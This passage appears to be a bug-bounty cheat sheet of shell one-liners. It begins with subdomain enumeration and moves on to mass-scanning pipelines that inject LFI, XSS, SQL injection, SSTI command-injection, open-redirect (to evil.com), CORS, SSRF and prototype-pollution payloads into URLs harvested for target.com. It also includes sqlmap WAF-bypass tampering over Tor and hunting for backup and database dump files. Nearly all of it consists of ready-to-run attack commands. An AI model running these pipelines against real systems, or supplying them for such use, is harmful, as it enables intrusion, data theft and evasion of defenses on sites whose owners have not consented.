## from Archive
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

## from JLDC
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

## from crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

## from ThreatMiner
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u

## from Anubis
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"

## from ThreatCrowd
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"

## from HackerTarget
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

## from AlienVault
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u

## from Censys
censys subdomains target.com

## from subdomain center
curl "https://api.subdomain.center/?domain=target.com" | jq -r '.[]' | sort -u
```
--------
## LFI:
```
cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```
----------------------
## Open Redirect:
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```
cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
-----------------------
## SSRF:
```
cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr 
```
----------------
## XSS:
### Knoxss mass hunting
```
file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
```
```
cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```
cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```
cat urls.txt | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
---------------------
## Hidden Dirs:
```
dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt
```
```
ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
```
## ffuf json to txt output
```
cat output.json | jq | grep -o '"url": "http[^"]*"' | grep -o 'http[^"]*' | anew out.txt

```
**Search for Sensitive files from Wayback**
```
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
```
-------------------
## SQLi:
```
cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&
for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
```
***Bypass WAF using TOR***
```
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent --tamper=space2comment
```
***find which host is vuln in output folder of sqlmap/ghauri***
``root@bb:~/.local/share/sqlmap/output#``
```
find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;
```
----------------
## CORS:
```
echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
---------------
## Prototype Pollution:
```
subfinder -d target.com -all -silent | httpx -silent -threads 100 | anew alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
-------------
## JS Files:
### Find JS Files:
```
cat target.txt | (gau || hakrawler || waybackurls || katana) | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew js.txt
```
```
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*\(text/javascript\|application/javascript\)'; then
    echo "$url"
  fi
done < urls.txt > js.txt
```
### Hidden Params in JS:
```
cat subs.txt | (gau || hakrawler || waybackurls || katana) | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
### Extract sensitive end-point in JS:
```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
-------------------------
### SSTI:
```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
```
echo target.com | gau --subs --threads 200 | httpx -silent -mc 200 -nc | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt && ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
---------------------------
## Scan IPs
```
cat my_ips.txt | xargs -L 100 shodan scan submit --wait 0
```
## Screenshots using Nuclei
```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
## SQLmap Tamper Scripts - WAF bypass
```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
```
## Shodan Cli
```
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
```
### Ffuf.json to only ffuf-url.txt
```
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
```
## Update golang
```
curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh | sudo bash
```

## Censys CLI
```
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```
## Nmap cidr to ips.txt
```
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'
```
### Xray urls scan
```
for i in $(cat subs.txt); do ./xray_linux_amd64 ws --basic-crawler $i --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html ; done
```  
### grep only nuclei info
```
result=$(sed -n 's/^\([^ ]*\) \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3 \4/p' file.txt)
echo "$result"
```
``[sqli-error-based:oracle] [http] [critical] https://test.com/en/events/e5?utm_source=test'&utm_medium=FUZZ'``
### Download js files
```
## curl
mkdir -p js_files; while IFS= read -r url || [ -n "$url" ]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl -sSL "$url" -o "downloaded_js_files/$filename"; done < "$1"; echo "Download complete."

## wget
sed -i 's/\r//' js.txt && for i in $(cat js.txt); do wget "$i"; done
```
### Filter only html/xml content-types for xss
```
cat urls.txt | grep "=" | grep "?" | uro | httpx -ct -silent -nc | grep -i -E "text/html|application/xhtml+xml|application/xml|text/xml|image/svg+xml" | cut -d '[' -f 1 | anew xml_html.txt

## using curl
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*text/\(html\|xml\)'; then
    echo "$url"
  fi
done < urls.txt > xml_html.txt
```
### Get favicon hash
```
curl https://favicon-hash.kmsec.uk/api/?url=https://test.com/favicon.ico | jq
```

### Build wordlists from a nuclei templates
```
for i in `grep -R yaml | awk -F: '{print $1}'`; do cat $i | grep 'BaseURL}}/' | awk -F '{{BaseURL}}' '{print $2}' | sed 's/"//g' | sed "s/'//g"; done
```
### To find dependency confusion(confused)
```
[ -f "urls.txt" ] && mkdir -p downloaded_json && while read -r url; do wget -q "$url" -O "downloaded_json/$(basename "$url")" && scan_output=$(confused -l npm "downloaded_json/$(basename "$url")") && echo "$scan_output" | grep -q "Issues found" && echo "Vulnerability found in: $(basename "$url")" || echo "No vulnerability found in: $(basename "$url")"; done < <(cat urls.txt)
```
### find params using x8
```
subdomain -d target.com -silent -all -recursive | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w parameters.txt -o output.txt'
```
### find reflected parameters for xss - [xss0r](https://raw.githubusercontent.com/xss0r/xssorRecon/refs/heads/main/reflection.py)
```
python3 reflection.py urls.txt | grep "Reflection found" | awk -F'[?&]' '!seen[$2]++' | tee reflected.txt
```
